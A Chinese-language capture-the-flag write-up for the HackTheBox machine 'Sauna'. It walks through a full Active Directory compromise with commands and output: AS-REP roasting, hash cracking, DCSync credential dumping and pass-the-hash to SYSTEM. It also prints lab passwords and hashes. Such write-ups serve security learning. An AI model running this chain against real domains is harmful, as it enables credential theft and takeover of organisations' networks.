---
title: Sauna
pagination_prev: null
pagination_next: null
---

# 端口扫描

全端口扫描
~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ sudo nmap -sT -p- 10.10.10.175 --min-rate 2000 -oA nmap/ports                                                                                                                  
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 00:11 EST
Nmap scan report for 10.10.10.175
Host is up (0.071s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.05 seconds

~~~

默认脚本扫描
~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ sudo nmap -sT -sV -sC -p 53,80,88,135,139,389,445,464,593,3268,3269,5985,9389,49668,49673,49674,49677,49689,49696 10.10.10.175 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 00:17 EST
Nmap scan report for 10.10.10.175
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 13:02:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T13:02:58
|_  start_date: N/A
|_clock-skew: 7h44m20s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.63 seconds

~~~

漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ sudo nmap -sT --script=vuln -p 53,80,88,135,139,389,445,464,593,3268,3269,5985,9389,49668,49673,49674,49677,49689,49696  10.10.10.175 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 00:17 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.175
Host is up (0.10s latency).

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.175
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.10.175:80/
|     Form id: email
|     Form action: #
|     
|     Path: http://10.10.10.175:80/single.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.175:80/single.html
|     Form id: 
|     Form action: #
|     
|     Path: http://10.10.10.175:80/about.html
|     Form id: email
|     Form action: #
|     
|     Path: http://10.10.10.175:80/index.html
|     Form id: email
|     Form action: #
|     
|     Path: http://10.10.10.175:80/contact.html
|     Form id: 
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 360.70 seconds


~~~

# 80(WEB)
看起来就是简单的静态页面，但是有出现职工的名字，进行一下搜集
![](Pasted%20image%2020250114134922.png)

~~~
Johnson
Watson
James Doe
James
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
Fergus
Hugo
Steven
Shaun
Bowie
Sophie
Smith
Bear
Kerb
Coins
Taylor
Driver
~~~

使用username-anarchy拓展用户名字典

~~~
┌──(kali㉿kali)-[~/Sauna/username-anarchy]
└─$ sudo ./username-anarchy -i users.txt > a.txt
~~~

通过kerbrute查找用户名是否有效，发现有效用户名fsmith

~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ ./kerbrute_linux_386 userenum --dc 10.10.10.175  -d EGOTISTICAL-BANK.LOCAL username-anarchy/a.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/14/25 - Ronnie Flathers @ropnop

2025/01/14 01:58:08 >  Using KDC(s):
2025/01/14 01:58:08 >   10.10.10.175:88

2025/01/14 01:58:08 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/01/14 01:58:09 >  Done! Tested 104 usernames (1 valid) in 1.033 seconds

~~~

通过用户名尝试获取无密码认证的TGT

~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ ./impacket-GetNPUsers  EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.10.10.175 -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for fsmith
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7927a2ac46f550243fc1b8760069500d$fb114038b7e5515a0a9ef47469542a5af45580a766d1e1cb2b916561cd06a5d8771aa77491c284fa868ef8cab757e86cb157f971ba4ee949093d984f1cf499bcab500d489a48c31ef6ad955040d8f7e0129b5006ef17e89a9b4f770d241a68f9c79b28bddf8cf1ed96b518debeae4e2e3385f74dc2e42c1ec519f917b2856db05fecc3338f6090abb381176c1635dcea49b4f813bfb065aa795a88bd9a67d852f8be9c60ba471848e4e61e22608571ba128e2ac45a30063d587053f5a4c0d6e34b7aba4b00e31d35eb187e4ec044e5541ed1b641016f3e574443ea5422ffcc63b4e5b884137a414a6b0d6f85d375714ca44d71fc89212eedd497bdbaf7798f6b
                                                                                                                        
~~~

通过hashcat破解出密码Thestrokes23

~~~
┌──(lizi㉿lizi)-[~]
└─$ hashcat -m 18200 fsmith-hash.txt  /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11400H @ 2.70GHz, 2856/5777 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 3 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7927a2ac46f550243fc1b8760069500d$fb114038b7e5515a0a9ef47469542a5af45580a766d1e1cb2b916561cd06a5d8771aa77491c284fa868ef8cab757e86cb157f971ba4ee949093d984f1cf499bcab500d489a48c31ef6ad955040d8f7e0129b5006ef17e89a9b4f770d241a68f9c79b28bddf8cf1ed96b518debeae4e2e3385f74dc2e42c1ec519f917b2856db05fecc3338f6090abb381176c1635dcea49b4f813bfb065aa795a88bd9a67d852f8be9c60ba471848e4e61e22608571ba128e2ac45a30063d587053f5a4c0d6e34b7aba4b00e31d35eb187e4ec044e5541ed1b641016f3e574443ea5422ffcc63b4e5b884137a414a6b0d6f85d375714ca44d71fc89212eedd497bdbaf7798f6b:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:7927a2a...798f6b
Time.Started.....: Tue Jan 14 15:25:02 2025 (4 secs)
Time.Estimated...: Tue Jan 14 15:25:06 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2798.4 kH/s (1.06ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Teague51

Started: Tue Jan 14 15:24:34 2025
Stopped: Tue Jan 14 15:25:07 2025
~~~

验证凭据有效

~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ nxc winrm 10.10.10.175  -u fsmith -p 'Thestrokes23'
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)

~~~

利用bloodhound采集信息

~~~
┌──(kali㉿kali)-[~/Sauna/username-anarchy]
└─$ bloodhound-python -c ALL -d EGOTISTICAL-BANK.LOCAL -u fsmith -p 'Thestrokes23'  -gc EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 --zip                                                                                                    

INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 15S
INFO: Compressing output into 20250114023844_bloodhound.zip

~~~

发现SVC_LOANMGR这个用户拥有DCSync的可能性，尝试横向移动到这个用户

![](Pasted%20image%2020250114160920.png)

先使用winpeas扫描一下，扫描发现存在一个自动登录的用户

![](Pasted%20image%2020250114164836.png)

利用凭据转储hash

~~~
┌──(kali㉿kali)-[~/Sauna]                                                                                                                                                                                                                  
└─$ python ./secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'                                                                                                                                                          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                      
                                                                                                                                                                                                                                           
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                                                                         
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                              
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                                                       
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::                                                                                                                                                     
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                             
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::                                                                                                                                                            
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                                                                                                                                    
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::                                                                                                                                    
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::                                                                                                                               
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8c61116d27a8c7f73dfae1b675ef9657:::                                                                                                                                                           
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7 
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b 
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:fde5f46b13828582f363b34daec545676b1584b946b21a1ffb5f28477a748fc8
SAUNA$:aes128-cts-hmac-sha1-96:dca3c3b657d698fbbd9c8a529b5576b6
SAUNA$:des-cbc-md5:29e5807f2073bcd5
[*] Cleaning up... 

~~~

使用hash进行登录，成功提权

~~~
┌──(kali㉿kali)-[~/Sauna]
└─$ ./psexec.py "administrator"@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file FFcQcgPc.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service mPRp on 10.10.10.175.....
[*] Starting service mPRp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


~~~

